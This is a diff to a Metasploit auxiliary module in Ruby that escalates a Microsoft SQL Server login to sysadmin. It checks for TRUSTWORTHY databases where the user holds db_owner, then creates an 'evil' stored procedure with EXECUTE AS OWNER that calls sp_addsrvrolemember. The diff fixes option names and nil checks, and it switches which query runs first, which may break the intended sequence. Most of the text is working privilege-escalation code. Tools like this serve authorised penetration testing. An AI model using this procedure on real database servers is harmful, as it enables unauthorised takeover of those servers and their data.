@@ -27,7 +27,7 @@ class Metasploit3 < Msf::Auxiliary
 
   def run
     # Check connection and issue initial query
-    print_status("Attempting to connect to the database server at #{rhost}:#{rport} as #{datastore['username']}...")
+    print_status("Attempting to connect to the database server at #{rhost}:#{rport} as #{datastore['USERNAME']}...")
     if mssql_login_datastore
       print_good('Connected.')
     else
@@ -42,7 +42,7 @@ class Metasploit3 < Msf::Auxiliary
 
     # Check if user has sysadmin role
     if user_status == 1
-      print_good("#{datastore['username']} has the sysadmin role, no escalation required.")
+      print_good("#{datastore['USERNAME']} has the sysadmin role, no escalation required.")
       disconnect
       return
     else
@@ -52,7 +52,7 @@ class Metasploit3 < Msf::Auxiliary
     # Check for trusted databases owned by sysadmins
     print_status("Checking for trusted databases owned by sysadmins...")
     trust_db_list = check_trust_dbs
-    if trust_db_list.length == 0
+    if trust_db_list.nil? || trust_db_list.length == 0
       print_error('No databases owned by sysadmin were found flagged as trustworthy.')
       disconnect
       return
@@ -67,7 +67,7 @@ class Metasploit3 < Msf::Auxiliary
     # Check if the user has the db_owner role in any of the databases
     print_status('Checking if the user has the db_owner role in any of them...')
     dbowner_status = check_db_owner(trust_db_list)
-    if dbowner_status == 0
+    if dbowner_status.nil?
       print_error("Fail buckets, the user doesn't have db_owner role anywhere.")
       disconnect
       return
@@ -141,7 +141,7 @@ class Metasploit3 < Msf::Auxiliary
 
       # Parse query results
       parse_results = result[:rows]
-      if parse_results.any?
+      if parse_results && parse_results.any?
         print_good("- db_owner on #{db[0]} found!")
         return db[0]
       end
@@ -151,6 +151,7 @@ class Metasploit3 < Msf::Auxiliary
   end
 
   def escalate_privs(dbowner_db)
+    print_status("#{dbowner_db}")
     # Create the evil stored procedure WITH EXECUTE AS OWNER
     evil_sql_create = "use #{dbowner_db};
     DECLARE @myevil as varchar(max)
@@ -159,7 +160,7 @@ class Metasploit3 < Msf::Auxiliary
     WITH EXECUTE AS OWNER
     as
     begin
-    EXEC sp_addsrvrolemember ''#{datastore['username']}'',''sysadmin''
+    EXEC sp_addsrvrolemember ''#{datastore['USERNAME']}'',''sysadmin''
     end';
     exec(@myevil);
     select 1;"
@@ -170,7 +171,7 @@ class Metasploit3 < Msf::Auxiliary
     DECLARE @myevil2 as varchar(max)
     set @myevil2 = 'EXEC sp_elevate_me'
     exec(@myevil2);"
-    mssql_query(evil_sql_create)
+    mssql_query(evilsql_run)
 
     # Remove evil procedure
     evilsql_remove = "use #{dbowner_db};
